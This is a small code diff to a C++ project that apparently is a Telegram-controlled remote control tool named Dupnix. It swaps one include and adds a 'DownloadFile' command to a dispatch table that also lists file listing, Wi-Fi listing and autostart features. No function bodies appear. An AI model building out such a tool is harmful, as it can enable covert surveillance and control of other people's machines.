@@ -9,7 +9,7 @@
 #include "parse.h"
 #include "telegram.h"
 #include "globals.h"
-#include "functions.h"
+#include "commands.h"
 
 //need to test autostart
 //autostart leaves o.bat file
@@ -50,6 +50,7 @@ std::vector <std::pair<std::string, void(*)(std::string)>> functions{
 	{"ListOfFiles", ListOfFiles}, 
 	{"WifiList", WifiList},
 	{"CloseForeground",TurnCloseForeground},
+	{"DownloadFile", DownloadFile},
 	{"UpdateDupnix", UpdateDupnix}
 
 };
